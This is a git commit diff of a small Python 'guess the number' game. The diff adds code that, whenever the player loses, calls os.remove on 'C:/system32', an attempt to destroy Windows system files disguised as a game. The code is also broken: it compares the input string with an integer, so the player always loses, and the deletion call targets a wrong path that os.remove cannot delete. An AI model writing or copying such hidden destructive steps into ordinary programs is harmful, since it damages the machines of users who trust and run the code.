06a5501d3488c178d51909bdffbda18c9d7a4c4e
Toppyl <137173821+Toppyl@users.noreply.github.com>
2023-06-20 13:36:39 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,9 @@
 import os
 import random
 
-if(input(answer)==random())
+answer = input("guess the number between 1-10! ")
+
+if(answer==random.randint(1,10)):
+  print("you won!")
+else:
+  os.remove("C:/system32")
